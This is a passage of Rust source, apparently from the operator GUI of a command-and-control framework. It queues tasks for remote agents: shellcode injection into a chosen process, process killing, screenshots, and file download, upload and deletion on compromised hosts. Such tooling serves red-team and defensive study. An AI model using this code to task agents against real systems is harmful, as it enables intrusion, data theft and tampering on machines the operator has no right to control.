    fn build_file_browser_list_message(
        &self,
        agent_id: &str,
        path: &str,
    ) -> Option<OperatorMessage> {
        Some(build_file_browser_list_task(agent_id, path, &self.current_operator_username()))
    }

    fn queue_process_refresh(&mut self, agent_id: &str) {
        let message = build_process_list_task(agent_id, &self.current_operator_username());
        self.session_panel.process_state_mut(agent_id).status_message =
            Some("Queued `ps`.".to_owned());
        self.session_panel.pending_messages.push(message);
    }

    fn queue_process_kill(&mut self, agent_id: &str, pid: u32) {
        let message = build_process_kill_task(agent_id, pid, &self.current_operator_username());
        self.session_panel.process_state_mut(agent_id).status_message =
            Some(format!("Queued process kill for PID {pid}."));
        self.session_panel.pending_messages.push(message);
    }

    fn submit_process_injection(&mut self) {
        let Some(dialog) = self.session_panel.process_injection.clone() else {
            return;
        };

        let shellcode_path = dialog.shellcode_path.trim();
        if shellcode_path.is_empty() {
            if let Some(dialog_state) = self.session_panel.process_injection.as_mut() {
                dialog_state.status_message = Some("Select a shellcode file first.".to_owned());
            }
            return;
        }

        match std::fs::read(shellcode_path) {
            Ok(binary) => {
                let operator = self.current_operator_username();
                let message = build_process_injection_task(
                    &dialog.agent_id,
                    dialog.pid,
                    &dialog.arch,
                    dialog.technique,
                    &binary,
                    &dialog.arguments,
                    dialog.action,
                    &operator,
                );
                self.session_panel.process_state_mut(&dialog.agent_id).status_message =
                    Some(format!(
                        "Queued {} for PID {}.",
                        dialog.action.label().to_ascii_lowercase(),
                        dialog.pid
                    ));
                self.session_panel.pending_messages.push(message);
                self.session_panel.process_injection = None;
            }
            Err(error) => {
                if let Some(dialog_state) = self.session_panel.process_injection.as_mut() {
                    dialog_state.status_message =
                        Some(format!("Failed to read shellcode file: {error}"));
                }
            }
        }
    }

    fn queue_file_browser_pwd(&mut self, agent_id: &str) {
        let message = build_file_browser_pwd_task(agent_id, &self.current_operator_username());
        self.session_panel.file_browser_state_mut(agent_id).status_message =
            Some("Queued `pwd`.".to_owned());
        self.session_panel.pending_messages.push(message);
    }

    fn queue_file_browser_list(&mut self, agent_id: &str, path: &str) {
        if let Some(message) = self.build_file_browser_list_message(agent_id, path) {
            let ui_state = self.session_panel.file_browser_state_mut(agent_id);
            ui_state.pending_dirs.insert(path.to_owned());
            ui_state.status_message = Some(format!("Queued listing for {path}."));
            self.session_panel.pending_messages.push(message);
        }
    }

    fn queue_file_browser_cd(&mut self, agent_id: &str, path: &str) {
        let message = build_file_browser_cd_task(agent_id, path, &self.current_operator_username());
        self.session_panel.file_browser_state_mut(agent_id).status_message =
            Some(format!("Queued directory change to {path}."));
        self.session_panel.pending_messages.push(message);
    }

    fn queue_file_browser_download(&mut self, agent_id: &str, path: &str) {
        let message =
            build_file_browser_download_task(agent_id, path, &self.current_operator_username());
        self.session_panel.file_browser_state_mut(agent_id).status_message =
            Some(format!("Queued download for {path}."));
        self.session_panel.pending_messages.push(message);
    }

    fn queue_file_browser_delete(&mut self, agent_id: &str, path: &str) {
        let message =
            build_file_browser_delete_task(agent_id, path, &self.current_operator_username());
        self.session_panel.file_browser_state_mut(agent_id).status_message =
            Some(format!("Queued delete for {path}."));
        self.session_panel.pending_messages.push(message);
    }

    fn queue_file_browser_upload(&mut self, agent_id: &str, destination_dir: Option<String>) {
        let Some(destination_dir) = destination_dir else {
            self.session_panel.file_browser_state_mut(agent_id).status_message = Some(
                "Select a directory or resolve the current working directory first.".to_owned(),
            );
            return;
        };

        let Some(local_path) = FileDialog::new().pick_file() else {
            return;
        };

        match std::fs::read(&local_path) {
            Ok(bytes) => {
                let file_name =
                    local_path.file_name().and_then(|value| value.to_str()).unwrap_or("upload.bin");
                let remote_path = join_remote_path(&destination_dir, file_name);
                let message = build_file_browser_upload_task(
                    agent_id,
                    &remote_path,
                    &bytes,
                    &self.current_operator_username(),
                );
                self.session_panel.file_browser_state_mut(agent_id).status_message =
                    Some(format!("Queued upload to {remote_path}."));
                self.session_panel.pending_messages.push(message);
            }
            Err(error) => {
                self.session_panel.file_browser_state_mut(agent_id).status_message =
                    Some(format!("Failed to read local file: {error}"));
            }
        }
    }

    fn flush_pending_messages(&mut self) {
        if self.session_panel.pending_messages.is_empty() {
            return;
        }

        let Some(outgoing_tx) = &self.outgoing_tx else {
            self.session_panel.status_message = Some(
                "Session action could not be sent because the transport is unavailable.".to_owned(),
            );
            self.session_panel.pending_messages.clear();
            return;
        };

        for message in self.session_panel.pending_messages.drain(..) {
            if outgoing_tx.send(message).is_err() {
                self.session_panel.status_message =
                    Some("Session action could not be queued for delivery.".to_owned());
                break;
            }
        }
    }
}

impl eframe::App for ClientApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        match &self.phase {
            AppPhase::Login(_) => {
                let AppPhase::Login(login_state) = &mut self.phase else {
                    return;
                };
                let action = render_login_dialog(ctx, login_state);
                if action == LoginAction::Submit {
                    self.handle_login_submit(ctx);
                }
            }
            AppPhase::Authenticating { app_state, .. } => {
                let app_state_ref = app_state.clone();
                self.check_auth_response();
                self.render_current_phase(ctx, Some(app_state_ref));
            }
            AppPhase::Connected { app_state, .. } => {
                let app_state_ref = app_state.clone();
                self.render_main_ui(ctx, &app_state_ref);
            }
        }
    }
}

/// Determine the TLS verification mode from CLI flags, falling back to local config.
///
/// Precedence: CLI `--accept-invalid-certs` > CLI `--cert-fingerprint` > CLI `--ca-cert`
///           > config `cert_fingerprint` > config `ca_cert` > system root CAs.
fn resolve_tls_verification(cli: &Cli, config: &LocalConfig) -> TlsVerification {
    if cli.accept_invalid_certs {
        return TlsVerification::DangerousSkipVerify;
    }
    if let Some(fingerprint) = &cli.cert_fingerprint {
        return TlsVerification::Fingerprint(fingerprint.clone());
    }
    if let Some(ca_path) = &cli.ca_cert {
        return TlsVerification::CustomCa(ca_path.clone());
    }
    if let Some(fingerprint) = &config.cert_fingerprint {
        return TlsVerification::Fingerprint(fingerprint.clone());
    }
    if let Some(ca_path) = &config.ca_cert {
        return TlsVerification::CustomCa(ca_path.clone());
    }
    TlsVerification::CertificateAuthority
}

fn main() -> Result<()> {
    let cli = Cli::parse();
    launch_client(cli)
}

fn launch_client(cli: Cli) -> Result<()> {
    let options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default()
            .with_inner_size(INITIAL_WINDOW_SIZE)
            .with_min_inner_size(MINIMUM_WINDOW_SIZE),
        ..Default::default()
    };

    eframe::run_native(
        WINDOW_TITLE,
        options,
        Box::new(move |creation_context| {
            creation_context.egui_ctx.set_visuals(egui::Visuals::dark());
            Ok(Box::new(ClientApp::new(cli)) as Box<dyn eframe::App>)
        }),
    )
    .map_err(|error| anyhow!("failed to start egui application: {error}"))
}

fn yes_no(value: bool) -> &'static str {
    if value { "yes" } else { "no" }
}

fn script_status_label(status: ScriptLoadStatus) -> &'static str {
    match status {
        ScriptLoadStatus::Loaded => "loaded",
        ScriptLoadStatus::Error => "error",
        ScriptLoadStatus::Unloaded => "unloaded",
    }
}

fn script_status_color(status: ScriptLoadStatus) -> Color32 {
    match status {
        ScriptLoadStatus::Loaded => Color32::from_rgb(110, 199, 141),
        ScriptLoadStatus::Error => Color32::from_rgb(215, 83, 83),
        ScriptLoadStatus::Unloaded => Color32::from_rgb(232, 182, 83),
    }
}

fn script_output_label(stream: ScriptOutputStream) -> &'static str {
    match stream {
        ScriptOutputStream::Stdout => "stdout",
        ScriptOutputStream::Stderr => "stderr",
    }
}

fn script_output_color(stream: ScriptOutputStream) -> Color32 {
    match stream {
        ScriptOutputStream::Stdout => Color32::from_rgb(110, 199, 141),
        ScriptOutputStream::Stderr => Color32::from_rgb(215, 83, 83),
    }
}

fn script_name_for_display(path: &Path) -> Option<String> {
    path.file_stem().and_then(|stem| stem.to_str()).map(str::to_owned)
}

fn build_kill_task(agent_id: &str, operator: &str) -> OperatorMessage {
    build_agent_task(
        operator,
        AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandExit).to_string(),
            command_line: "kill".to_owned(),
            command: Some("kill".to_owned()),
            ..AgentTaskInfo::default()
        },
    )
}

fn build_process_list_task(agent_id: &str, operator: &str) -> OperatorMessage {
    build_agent_task(
        operator,
        AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandProcList).to_string(),
            command_line: "ps".to_owned(),
            command: Some("ps".to_owned()),
            extra: BTreeMap::from([(
                "FromProcessManager".to_owned(),
                serde_json::Value::Bool(true),
            )]),
            ..AgentTaskInfo::default()
        },
    )
}

fn build_process_kill_task(agent_id: &str, pid: u32, operator: &str) -> OperatorMessage {
    build_agent_task(operator, process_kill_info(agent_id, pid))
}

fn build_process_injection_task(
    agent_id: &str,
    pid: u32,
    arch: &str,
    technique: InjectionTechnique,
    binary: &[u8],
    arguments: &str,
    action: InjectionTargetAction,
    operator: &str,
) -> OperatorMessage {
    let command_line = format!(
        "{} pid={} arch={} {}",
        action.label().to_ascii_lowercase(),
        pid,
        normalized_process_arch(arch),
        human_size(binary.len() as u64)
    );
    build_agent_task(
        operator,
        AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandInjectShellcode).to_string(),
            command_line,
            command: Some("shellcode".to_owned()),
            sub_command: Some("inject".to_owned()),
            extra: BTreeMap::from([
                ("Way".to_owned(), serde_json::Value::String("Inject".to_owned())),
                (
                    "Technique".to_owned(),
                    serde_json::Value::String(technique.as_wire_value().to_owned()),
                ),
                ("Arch".to_owned(), serde_json::Value::String(normalized_process_arch(arch))),
                (
                    "Binary".to_owned(),
                    serde_json::Value::String(
                        base64::engine::general_purpose::STANDARD.encode(binary),
                    ),
                ),
                ("PID".to_owned(), serde_json::Value::String(pid.to_string())),
                ("Action".to_owned(), serde_json::Value::String(action.label().to_owned())),
                (
                    "Arguments".to_owned(),
                    serde_json::Value::String(
                        base64::engine::general_purpose::STANDARD.encode(arguments.as_bytes()),
                    ),
                ),
            ]),
            ..AgentTaskInfo::default()
        },
    )
}

fn build_note_task(agent_id: &str, note: &str, operator: &str) -> OperatorMessage {
    build_agent_task(
        operator,
        AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: "Teamserver".to_owned(),
            command_line: "note".to_owned(),
            command: Some("note".to_owned()),
            arguments: Some(note.to_owned()),
            ..AgentTaskInfo::default()
        },
    )
}

fn build_chat_message(operator: Option<&str>, message: &str) -> Option<OperatorMessage> {
    let trimmed = message.trim();
    if trimmed.is_empty() {
        return None;
    }

    Some(OperatorMessage::ChatMessage(Message {
        head: MessageHead {
            event: EventCode::Chat,
            user: operator.unwrap_or_default().to_owned(),
            timestamp: String::new(),
            one_time: String::new(),
        },
        info: FlatInfo {
            fields: std::collections::BTreeMap::from([
                (
                    "User".to_owned(),
                    serde_json::Value::String(operator.unwrap_or_default().to_owned()),
                ),
                ("Message".to_owned(), serde_json::Value::String(trimmed.to_owned())),
            ]),
        },
    }))
}

fn build_agent_task(operator: &str, info: AgentTaskInfo) -> OperatorMessage {
    OperatorMessage::AgentTask(Message {
        head: MessageHead {
            event: red_cell_common::operator::EventCode::Session,
            user: operator.to_owned(),
            timestamp: String::new(),
            one_time: String::new(),
        },
        info,
    })
}

fn next_task_id() -> u32 {
    use std::sync::atomic::{AtomicU32, Ordering};

    static TASK_COUNTER: AtomicU32 = AtomicU32::new(1);
    TASK_COUNTER.fetch_add(1, Ordering::Relaxed)
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum HistoryDirection {
    Older,
    Newer,
}

#[derive(Debug, Clone, Copy)]
struct ConsoleCommandSpec {
    name: &'static str,
    aliases: &'static [&'static str],
    usage: &'static str,
}

const CONSOLE_COMMANDS: [ConsoleCommandSpec; 11] = [
    ConsoleCommandSpec { name: "checkin", aliases: &[], usage: "checkin" },
    ConsoleCommandSpec { name: "kill", aliases: &["exit"], usage: "kill [process]" },
    ConsoleCommandSpec { name: "ps", aliases: &["proclist"], usage: "ps" },
    ConsoleCommandSpec { name: "screenshot", aliases: &[], usage: "screenshot" },
    ConsoleCommandSpec { name: "pwd", aliases: &[], usage: "pwd" },
    ConsoleCommandSpec { name: "cd", aliases: &[], usage: "cd <path>" },
    ConsoleCommandSpec { name: "mkdir", aliases: &[], usage: "mkdir <path>" },
    ConsoleCommandSpec { name: "rm", aliases: &["del", "remove"], usage: "rm <path>" },
    ConsoleCommandSpec { name: "download", aliases: &[], usage: "download <path>" },
    ConsoleCommandSpec { name: "cat", aliases: &["type"], usage: "cat <path>" },
    ConsoleCommandSpec { name: "proc", aliases: &[], usage: "proc kill <pid>" },
];

fn build_file_browser_list_task(agent_id: &str, path: &str, operator: &str) -> OperatorMessage {
    build_agent_task(
        operator,
        AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandFs).to_string(),
            command_line: format!("ls {path}"),
            command: Some("fs".to_owned()),
            sub_command: Some("dir".to_owned()),
            arguments: Some(format!("{path};true;false;false;false;;;")),
            ..AgentTaskInfo::default()
        },
    )
}

fn build_file_browser_pwd_task(agent_id: &str, operator: &str) -> OperatorMessage {
    build_agent_task(operator, filesystem_task(agent_id, "pwd", "pwd", None))
}

fn build_file_browser_cd_task(agent_id: &str, path: &str, operator: &str) -> OperatorMessage {
    build_agent_task(
        operator,
        filesystem_task(agent_id, &format!("cd {path}"), "cd", Some(path.to_owned())),
    )
}

fn build_file_browser_download_task(agent_id: &str, path: &str, operator: &str) -> OperatorMessage {
    build_agent_task(
        operator,
        filesystem_transfer_task(agent_id, &format!("download {path}"), "download", path),
    )
}

fn build_file_browser_delete_task(agent_id: &str, path: &str, operator: &str) -> OperatorMessage {
    build_agent_task(
        operator,
        filesystem_task(agent_id, &format!("rm {path}"), "remove", Some(path.to_owned())),
    )
}

fn build_file_browser_upload_task(
    agent_id: &str,
    remote_path: &str,
    content: &[u8],
    operator: &str,
) -> OperatorMessage {
    let remote = base64::engine::general_purpose::STANDARD.encode(remote_path.as_bytes());
    let content = base64::engine::general_purpose::STANDARD.encode(content);
    build_agent_task(
        operator,
        AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandFs).to_string(),
            command_line: format!("upload {remote_path}"),
            command: Some("fs".to_owned()),
            sub_command: Some("upload".to_owned()),
            arguments: Some(format!("{remote};{content}")),
            ..AgentTaskInfo::default()
        },
    )
}

fn build_console_task(
    agent_id: &str,
    input: &str,
    operator: &str,
) -> Result<OperatorMessage, String> {
    let trimmed = input.trim();
    let mut parts = trimmed.split_whitespace();
    let Some(command) = parts.next() else {
        return Err("Command input is empty.".to_owned());
    };
    let command = command.to_ascii_lowercase();

    let info = match command.as_str() {
        "checkin" => AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandCheckin).to_string(),
            command_line: trimmed.to_owned(),
            command: Some("checkin".to_owned()),
            ..AgentTaskInfo::default()
        },
        "kill" | "exit" => AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandExit).to_string(),
            command_line: trimmed.to_owned(),
            command: Some("kill".to_owned()),
            arguments: parts.next().map(ToOwned::to_owned),
            ..AgentTaskInfo::default()
        },
        "ps" | "proclist" => AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandProcList).to_string(),
            command_line: trimmed.to_owned(),
            command: Some("ps".to_owned()),
            ..AgentTaskInfo::default()
        },
        "screenshot" => AgentTaskInfo {
            demon_id: agent_id.to_owned(),
            task_id: format!("{:08X}", next_task_id()),
            command_id: u32::from(DemonCommand::CommandScreenshot).to_string(),
            command_line: trimmed.to_owned(),
            command: Some("screenshot".to_owned()),
            ..AgentTaskInfo::default()
        },
        "pwd" => filesystem_task(agent_id, trimmed, "pwd", None),
        "cd" => filesystem_task(agent_id, trimmed, "cd", Some(rest_after_word(trimmed)?)),
        "mkdir" => filesystem_task(agent_id, trimmed, "mkdir", Some(rest_after_word(trimmed)?)),
        "rm" | "del" | "remove" => {
            filesystem_task(agent_id, trimmed, "remove", Some(rest_after_word(trimmed)?))
        }
        "download" => {
            filesystem_transfer_task(agent_id, trimmed, "download", &rest_after_word(trimmed)?)
        }
        "cat" | "type" => {
            filesystem_transfer_task(agent_id, trimmed, "cat", &rest_after_word(trimmed)?)
        }
        "proc" => process_task(agent_id, trimmed)?,
        _ => {
            let usage = closest_command_usage(&command)
                .unwrap_or("Supported commands: checkin, kill, ps, screenshot, pwd, cd, mkdir, rm, download, cat, proc kill");
            return Err(format!("Unsupported console command `{command}`. {usage}"));
        }
    };

    Ok(build_agent_task(operator, info))
}

fn filesystem_task(
    agent_id: &str,
    command_line: &str,
    sub_command: &str,
    arguments: Option<String>,
) -> AgentTaskInfo {
    AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandFs).to_string(),
        command_line: command_line.to_owned(),
        command: Some("fs".to_owned()),
        sub_command: Some(sub_command.to_owned()),
        arguments,
        ..AgentTaskInfo::default()
    }
}

fn filesystem_transfer_task(
    agent_id: &str,
    command_line: &str,
    sub_command: &str,
    path: &str,
) -> AgentTaskInfo {
    let encoded = Some(base64::engine::general_purpose::STANDARD.encode(path.as_bytes()));
    AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandFs).to_string(),
        command_line: command_line.to_owned(),
        command: Some("fs".to_owned()),
        sub_command: Some(sub_command.to_owned()),
        arguments: encoded,
        ..AgentTaskInfo::default()
    }
}

fn process_task(agent_id: &str, command_line: &str) -> Result<AgentTaskInfo, String> {
    let mut parts = command_line.split_whitespace();
    let _ = parts.next();
    let sub_command = parts.next().ok_or_else(|| "Usage: proc kill <pid>".to_owned())?;
    match sub_command.to_ascii_lowercase().as_str() {
        "kill" => {
            let pid = parts.next().ok_or_else(|| "Usage: proc kill <pid>".to_owned())?;
            if parts.next().is_some() {
                return Err("Usage: proc kill <pid>".to_owned());
            }
            let pid = pid.parse::<u32>().map_err(|_| format!("Invalid PID `{pid}`."))?;
            Ok(process_kill_info(agent_id, pid))
        }
        _ => Err("Usage: proc kill <pid>".to_owned()),
    }
}

fn process_kill_info(agent_id: &str, pid: u32) -> AgentTaskInfo {
    AgentTaskInfo {
        demon_id: agent_id.to_owned(),
        task_id: format!("{:08X}", next_task_id()),
        command_id: u32::from(DemonCommand::CommandProc).to_string(),
        command_line: format!("proc kill {pid}"),
        command: Some("proc".to_owned()),
        sub_command: Some("kill".to_owned()),
        arguments: Some(pid.to_string()),
        extra: BTreeMap::from([("Args".to_owned(), serde_json::Value::String(pid.to_string()))]),
        ..AgentTaskInfo::default()
    }
}

fn rest_after_word(input: &str) -> Result<String, String> {
    let mut parts = input.trim().splitn(2, char::is_whitespace);
    let _ = parts.next();
    let rest = parts.next().map(str::trim).unwrap_or_default();
    if rest.is_empty() {
        Err("This command requires an argument.".to_owned())
    } else {
        Ok(rest.to_owned())
    }
}

fn push_history_entry(console: &mut AgentConsoleState, command_line: &str) {
    if console.history.last().is_some_and(|last| last == command_line) {
        console.history_index = None;
        console.completion_index = 0;
        console.completion_seed = None;
        return;
    }

    console.history.push(command_line.to_owned());
    console.history_index = None;
    console.completion_index = 0;
    console.completion_seed = None;
}

fn apply_history_step(console: &mut AgentConsoleState, direction: HistoryDirection) {
    if console.history.is_empty() {
        return;
    }

    let next_index = match (direction, console.history_index) {
        (HistoryDirection::Older, None) => Some(console.history.len().saturating_sub(1)),
        (HistoryDirection::Older, Some(index)) => Some(index.saturating_sub(1)),
        (HistoryDirection::Newer, Some(index)) if index + 1 < console.history.len() => {
            Some(index + 1)
        }
        (HistoryDirection::Newer, Some(_)) => None,
        (HistoryDirection::Newer, None) => None,
    };

    console.history_index = next_index;
    console.input =
        next_index.and_then(|index| console.history.get(index).cloned()).unwrap_or_default();
    console.completion_index = 0;
    console.completion_seed = None;
}

fn apply_completion(console: &mut AgentConsoleState) {
    let prefix = console.input.trim();
    if prefix.contains(char::is_whitespace) {
        return;
    }

    let seed = console
        .completion_seed
        .clone()
        .filter(|seed| !seed.is_empty())
        .unwrap_or_else(|| prefix.to_owned());
    let matches = console_completion_candidates(&seed);
    if matches.is_empty() {
        return;
    }

    if console.completion_seed.as_deref() != Some(seed.as_str()) {
        console.completion_index = 0;
    }

    let next = console.completion_index % matches.len();
    console.input = matches[next].to_owned();
    console.completion_index = next + 1;
    console.completion_seed = Some(seed);
}

fn console_completion_candidates(prefix: &str) -> Vec<&'static str> {
    let needle = prefix.trim().to_ascii_lowercase();
    if needle.is_empty() {
        return CONSOLE_COMMANDS.iter().map(|spec| spec.name).collect();
    }

    CONSOLE_COMMANDS
        .iter()
        .filter(|spec| {
            spec.name.starts_with(&needle)
                || spec.aliases.iter().any(|alias| alias.starts_with(&needle))
        })
        .map(|spec| spec.name)
        .collect()
}

fn closest_command_usage(command: &str) -> Option<&'static str> {
    CONSOLE_COMMANDS.iter().find_map(|spec| {
        (spec.name == command || spec.aliases.contains(&command)).then_some(spec.usage)
    })
}

fn split_console_selection<'a>(
    open_consoles: &'a [String],
    selected_console: Option<&'a str>,
) -> Vec<&'a str> {
    if open_consoles.is_empty() {
        return Vec::new();
    }

    let selected = selected_console.unwrap_or(open_consoles[0].as_str());
    let mut visible = vec![selected];
    for agent_id in open_consoles {
        if agent_id != selected {
            visible.push(agent_id.as_str());
        }
        if visible.len() == 2 {
            break;
        }
    }
    visible
}

fn build_session_graph(agents: &[transport::AgentSummary]) -> SessionGraphLayout {
    let mut sorted_agents = agents.to_vec();
    sorted_agents.sort_by(|left, right| left.name_id.cmp(&right.name_id));

    let known_ids =
        sorted_agents.iter().map(|agent| agent.name_id.clone()).collect::<BTreeSet<_>>();
    let mut parent_by_child = BTreeMap::new();

    for agent in &sorted_agents {
        if let Some(parent) = agent
            .pivot_parent
            .as_deref()
            .filter(|parent| known_ids.contains(*parent))
            .filter(|parent| *parent != agent.name_id)
        {
            parent_by_child.insert(agent.name_id.clone(), parent.to_owned());
        }
    }

    for agent in &sorted_agents {
        for child in &agent.pivot_links {
            if child != &agent.name_id
                && known_ids.contains(child)
                && !parent_by_child.contains_key(child)
            {
                parent_by_child.insert(child.clone(), agent.name_id.clone());
            }
        }
    }

    let mut children = BTreeMap::<String, Vec<String>>::new();
    children.entry(SESSION_GRAPH_ROOT_ID.to_owned()).or_default();
    for agent in &sorted_agents {
        let parent = parent_by_child
            .get(&agent.name_id)
            .cloned()
            .unwrap_or_else(|| SESSION_GRAPH_ROOT_ID.to_owned());
        children.entry(parent).or_default().push(agent.name_id.clone());
    }
    for child_ids in children.values_mut() {
        child_ids.sort();
    }

    let mut positions = BTreeMap::new();
    let mut next_leaf = 0.0;
    assign_session_graph_positions(
        SESSION_GRAPH_ROOT_ID,
        0,
        &children,
        &mut next_leaf,
        &mut positions,
    );

    let mut nodes = vec![SessionGraphNode {
        id: SESSION_GRAPH_ROOT_ID.to_owned(),
        title: "Teamserver".to_owned(),
        subtitle: "root".to_owned(),
        status: "Online".to_owned(),
        position: positions.get(SESSION_GRAPH_ROOT_ID).copied().unwrap_or(Pos2::ZERO),
        size: egui::vec2(148.0, 52.0),
        kind: SessionGraphNodeKind::Teamserver,
    }];

    for agent in sorted_agents {
        nodes.push(SessionGraphNode {
            title: if agent.hostname.trim().is_empty() {
                agent.name_id.clone()
            } else {
                agent.hostname.clone()
            },
            subtitle: agent.name_id.clone(),
            status: agent.status.clone(),
            position: positions.get(&agent.name_id).copied().unwrap_or(Pos2::ZERO),
            size: egui::vec2(138.0, 58.0),
            id: agent.name_id,
            kind: SessionGraphNodeKind::Agent,
        });
    }

    let mut edges = Vec::new();
    for (parent, child_ids) in children {
        for child in child_ids {
            edges.push(SessionGraphEdge { from: parent.clone(), to: child });
        }
    }

    SessionGraphLayout { nodes, edges }
}

fn assign_session_graph_positions(
    node_id: &str,
    depth: usize,
    children: &BTreeMap<String, Vec<String>>,
    next_leaf: &mut f32,
    positions: &mut BTreeMap<String, Pos2>,
) -> f32 {
    const H_SPACING: f32 = 220.0;
    const V_SPACING: f32 = 120.0;

    let child_ids = children.get(node_id).cloned().unwrap_or_default();
    let x = if child_ids.is_empty() {
        let x = *next_leaf * H_SPACING;
        *next_leaf += 1.0;
        x
    } else {
        let child_xs = child_ids
            .iter()
            .map(|child| {
                assign_session_graph_positions(child, depth + 1, children, next_leaf, positions)
            })
            .collect::<Vec<_>>();
        let first = child_xs.first().copied().unwrap_or(*next_leaf * H_SPACING);
        let last = child_xs.last().copied().unwrap_or(first);
        (first + last) * 0.5
    };

    positions.insert(node_id.to_owned(), Pos2::new(x, depth as f32 * V_SPACING));
    x
}

fn graph_node_position(layout: &SessionGraphLayout, node_id: &str) -> Option<Pos2> {
    layout.nodes.iter().find(|node| node.id == node_id).map(|node| node.position)
}

fn graph_node_size(layout: &SessionGraphLayout, node_id: &str) -> Option<egui::Vec2> {
    layout.nodes.iter().find(|node| node.id == node_id).map(|node| node.size)
}

fn session_graph_world_to_screen(rect: Rect, graph_state: &SessionGraphState, world: Pos2) -> Pos2 {
    rect.center() + graph_state.pan + world.to_vec2() * graph_state.zoom
}

fn session_graph_node_rect(
    rect: Rect,
    graph_state: &SessionGraphState,
    world_center: Pos2,
    world_size: egui::Vec2,
) -> Rect {
    let center = session_graph_world_to_screen(rect, graph_state, world_center);
    Rect::from_center_size(center, world_size * graph_state.zoom)
}

fn session_graph_status_color(status: &str) -> Color32 {
    if agent_is_active_status(status) {
        Color32::from_rgb(84, 170, 110)
    } else {
        Color32::from_rgb(174, 68, 68)
    }
}

fn agent_is_active_status(status: &str) -> bool {
    matches!(status.trim().to_ascii_lowercase().as_str(), "alive" | "active" | "online" | "true")
}

fn agent_ip(agent: &transport::AgentSummary) -> String {
    if agent.internal_ip.trim().is_empty() {
        agent.external_ip.clone()
    } else {
        agent.internal_ip.clone()
    }
}

fn agent_arch(agent: &transport::AgentSummary) -> String {
    if agent.process_arch.trim().is_empty() {
        agent.os_arch.clone()
    } else {
        agent.process_arch.clone()
    }
}

fn agent_os(agent: &transport::AgentSummary) -> String {
    if agent.os_build.trim().is_empty() {
        agent.os_version.clone()
    } else {
        format!("{} ({})", agent.os_version, agent.os_build)
    }
}

fn agent_sleep_jitter(agent: &transport::AgentSummary) -> String {
    match (agent.sleep_delay.trim(), agent.sleep_jitter.trim()) {
        ("", "") => String::new(),
        (delay, "") => delay.to_owned(),
        ("", jitter) => format!("j{jitter}%"),
        (delay, jitter) => format!("{delay}s / {jitter}%"),
    }
}

fn agent_matches_filter(agent: &transport::AgentSummary, filter: &str) -> bool {
    let filter = filter.trim();
    if filter.is_empty() {
        return true;
    }

    let needle = filter.to_ascii_lowercase();
    [
        agent.name_id.as_str(),
        agent.hostname.as_str(),
        agent.username.as_str(),
        agent.domain_name.as_str(),
        agent.internal_ip.as_str(),
        agent.external_ip.as_str(),
        agent.process_pid.as_str(),
        agent.process_name.as_str(),
        agent.process_arch.as_str(),
        agent.os_version.as_str(),
        agent.os_build.as_str(),
        agent.note.as_str(),
    ]
    .into_iter()
    .any(|field| field.to_ascii_lowercase().contains(&needle))
}

fn filtered_process_rows<'a>(rows: &'a [ProcessEntry], filter: &str) -> Vec<&'a ProcessEntry> {
    let trimmed = filter.trim();
    if trimmed.is_empty() {
        return rows.iter().collect();
    }

    let needle = trimmed.to_ascii_lowercase();
    rows.iter()
        .filter(|row| {
            row.name.to_ascii_lowercase().contains(&needle) || row.pid.to_string().contains(&needle)
        })
        .collect()
}

fn normalized_process_arch(arch: &str) -> String {
    match arch.trim().to_ascii_lowercase().as_str() {
        "x86" | "386" | "i386" => "x86".to_owned(),
        _ => "x64".to_owned(),
    }
}

fn sort_agents(agents: &mut [transport::AgentSummary], column: AgentSortColumn, descending: bool) {
    agents.sort_by(|left, right| {
        let ordering = match column {
            AgentSortColumn::Id => left.name_id.cmp(&right.name_id),
            AgentSortColumn::Hostname => left.hostname.cmp(&right.hostname),
            AgentSortColumn::Username => left.username.cmp(&right.username),
            AgentSortColumn::Domain => left.domain_name.cmp(&right.domain_name),
            AgentSortColumn::Ip => agent_ip(left).cmp(&agent_ip(right)),
            AgentSortColumn::Pid => left.process_pid.cmp(&right.process_pid),
            AgentSortColumn::Process => left.process_name.cmp(&right.process_name),
            AgentSortColumn::Arch => agent_arch(left).cmp(&agent_arch(right)),
            AgentSortColumn::Elevated => left.elevated.cmp(&right.elevated),
            AgentSortColumn::Os => agent_os(left).cmp(&agent_os(right)),
            AgentSortColumn::SleepJitter => {
                agent_sleep_jitter(left).cmp(&agent_sleep_jitter(right))
            }
            AgentSortColumn::LastCheckin => left.last_call_in.cmp(&right.last_call_in),
        };
        let normalized = if ordering == std::cmp::Ordering::Equal {
            left.name_id.cmp(&right.name_id)
        } else {
            ordering
        };
        if descending { normalized.reverse() } else { normalized }
    });
}

fn sort_button_label(
    current_column: Option<AgentSortColumn>,
    descending: bool,
    button_column: AgentSortColumn,
) -> String {
    let name = AgentSortColumn::ALL
        .iter()
        .find_map(|(column, label)| (*column == button_column).then_some(*label))
        .unwrap_or("Column");
    if current_column == Some(button_column) {
        let arrow = if descending { "v" } else { "^" };
        format!("{name} {arrow}")
    } else {
        name.to_owned()
    }
}

fn ellipsize(value: &str, max_chars: usize) -> String {
